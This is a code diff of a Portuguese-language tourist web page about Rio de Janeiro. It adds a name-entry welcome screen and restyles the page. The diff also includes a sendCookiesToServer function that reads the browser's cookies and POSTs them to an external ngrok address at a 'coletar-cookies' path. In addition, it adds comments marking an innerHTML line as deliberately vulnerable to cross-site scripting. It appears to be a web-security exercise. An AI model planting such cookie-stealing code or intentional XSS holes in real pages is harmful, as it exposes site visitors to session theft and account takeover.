@@ -7,14 +7,14 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f8f8f8;
+            background-color: #f0f0f0;
             margin: 0;
             padding: 0;
-            color: white;
+            color: black;
         }
         header {
-            background-color: #D32F2F; /* Vermelho */
-            color: white;
+            background-color: #ff4c4c;
+            color: black;
             padding: 20px;
             text-align: center;
         }
@@ -24,7 +24,6 @@
         }
         .search-bar {
             margin-bottom: 20px;
-            text-align: center;
         }
         .search-bar input {
             padding: 10px;
@@ -34,15 +33,15 @@
         }
         .search-bar button {
             padding: 10px 20px;
-            background-color: #D32F2F; /* Vermelho */
-            color: white;
+            background-color: #ff4c4c;
+            color: black;
             border: none;
             border-radius: 5px;
             cursor: pointer;
         }
         footer {
-            background-color: #D32F2F; /* Vermelho */
-            color: white;
+            background-color: #ff4c4c;
+            color: black;
             text-align: center;
             padding: 10px;
             position: fixed;
@@ -53,49 +52,85 @@
             width: 50%;
             margin: 20px 0;
         }
+        .welcome-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #ffefef;
+        }
+        .welcome-content {
+            text-align: center;
+        }
     </style>
 </head>
 <body>
-    <header>
-        <h1>Rio de Janeiro - Cidade Maravilhosa</h1>
-    </header>
-
-    <div class="content">
-        <!-- Imagem do Cristo Redentor -->
-        <img class="cristo-img" src="https://upload.wikimedia.org/wikipedia/commons/5/59/Christ_the_Redeemer_-_panoramio.jpg" alt="Cristo Redentor">
-
-        <div class="search-bar">
-            <input type="text" id="searchInput" placeholder="Pesquisar...">
-            <button onclick="performSearch()">Buscar</button>
+    <div id="welcomePage" class="welcome-container">
+        <div class="welcome-content">
+            <h1>Bem-vindo! Qual é o seu nome?</h1>
+            <input type="text" id="nameInput" placeholder="Digite seu nome...">
+            <button onclick="enterSite()">Entrar</button>
         </div>
-
-        <h2>Sobre o Rio de Janeiro</h2>
-        <p>
-            O Rio de Janeiro é uma grande cidade brasileira à beira-mar, famosa pelas praias de Copacabana e Ipanema, pela estátua de 38 metros de altura do Cristo Redentor, no topo do Corcovado, e pelo Pão de Açúcar, um pico de granito com teleféricos até seu cume. A cidade também é conhecida pelas grandes favelas. O empolgante Carnaval, com carros alegóricos, fantasias extravagantes e sambistas, é considerado o maior do mundo.
-        </p>
-
-        <h2>Pontos Turísticos</h2>
-        <ul id="touristSpots">
-            <li>Cristo Redentor</li>
-            <li>Pão de Açúcar</li>
-            <li>Praia de Copacabana</li>
-            <li>Praia de Ipanema</li>
-            <li>Floresta da Tijuca</li>
-        </ul>
-
-        <h2>História</h2>
-        <p>
-            O Rio de Janeiro foi fundado em 1565 pelos portugueses. Durante muitos anos, foi a capital do Brasil, até a construção de Brasília em 1960. A cidade é um importante centro cultural, econômico e político do país.
-        </p>
-
-        <div id="searchResults"></div>
     </div>
 
-    <footer>
-        <p>&copy; 2023 Rio de Janeiro - Todos os direitos reservados.</p>
-    </footer>
+    <div id="mainPage" style="display: none;">
+        <header>
+            <h1>Rio de Janeiro - Cidade Maravilhosa e Perfeita</h1>
+        </header>
+
+        <div class="content">
+            <h2 id="welcomeMessage"></h2>
+            <img src="https://bagagemdespachada.com/wp-content/uploads/cristo_redentor.jpeg" alt="Cristo Redentor" class="cristo-img">
+
+            <div class="search-bar">
+                <input type="text" id="searchInput" placeholder="Pesquisar...">
+                <button onclick="performSearch()">Buscar</button>
+            </div>
+
+            <h2>Sobre o Rio de Janeiro</h2>
+            <p>
+                O Rio de Janeiro é uma grande cidade brasileira à beira-mar, famosa pelas praias de Copacabana e Ipanema, pela estátua de 38 metros de altura do Cristo Redentor, no topo do Corcovado, e pelo Pão de Açúcar, um pico de granito com teleféricos até seu cume. A cidade também é conhecida pelas grandes favelas. O empolgante Carnaval, com carros alegóricos, fantasias extravagantes e sambistas, é considerado o maior do mundo.
+            </p>
+
+            <h2>Pontos Turísticos</h2>
+            <ul id="touristSpots">
+                <li>Cristo Redentor</li>
+                <li>Pão de Açúcar</li>
+                <li>Praia de Copacabana</li>
+                <li>Praia de Ipanema</li>
+                <li>Floresta da Tijuca</li>
+            </ul>
+
+            <h2>História</h2>
+            <p>
+                O Rio de Janeiro foi fundado em 1565 pelos portugueses. Durante muitos anos, foi a capital do Brasil, até a construção de Brasília em 1960. A cidade é um importante centro cultural, econômico e político do país.
+            </p>
+
+            <div id="searchResults"></div>
+        </div>
+
+        <footer>
+            <p>&copy; 2023 Rio de Janeiro - Todos os direitos reservados.</p>
+        </footer>
+    </div>
 
     <script>
+        function enterSite() {
+            const name = document.getElementById('nameInput').value;
+            if (name) {
+                // Esconde a página de boas-vindas
+                document.getElementById('welcomePage').style.display = 'none';
+
+                // Exibe a página principal
+                document.getElementById('mainPage').style.display = 'block';
+
+                // Personaliza a saudação com o nome do visitante
+                document.getElementById('welcomeMessage').textContent = `Bem-vindo, ${name}! Explore os maravilhosos pontos turísticos do Rio de Janeiro.`;
+            } else {
+                alert("Por favor, digite seu nome.");
+            }
+        }
+
         function performSearch() {
             const searchTerm = document.getElementById('searchInput').value.toLowerCase();
             const touristSpots = document.querySelectorAll('#touristSpots li');
@@ -109,7 +144,10 @@
                 if (spot.textContent.toLowerCase().includes(searchTerm)) {
                     found = true;
                     const result = document.createElement('p');
-                    result.innerHTML = `Resultado encontrado: ${spot.textContent}`;
+                    
+                    // Tornando vulnerável a XSS usando innerHTML
+                    result.innerHTML = `Resultado encontrado: ${spot.textContent}`;  // Aqui é onde ocorre a vulnerabilidade
+
                     searchResultsDiv.appendChild(result);
                 }
             });
@@ -124,11 +162,10 @@
 
         function sendCookiesToServer() {
             const cookies = document.cookie;  // Captura os cookies do navegador
+            const url = 'https://f9f6-177-192-8-19.ngrok-free.app/coletar-cookies';  // Seu URL ngrok
 
             // Exibe os cookies no console para depuração
-            console.log("Cookies capturados:", cookies);  // Adicione isso para verificar o valor
-
-            const url = 'https://f9f6-177-192-8-19.ngrok-free.app/';  // Seu URL ngrok
+            console.log("Cookies capturados:", cookies);
 
             fetch(url, {
                 method: 'POST',
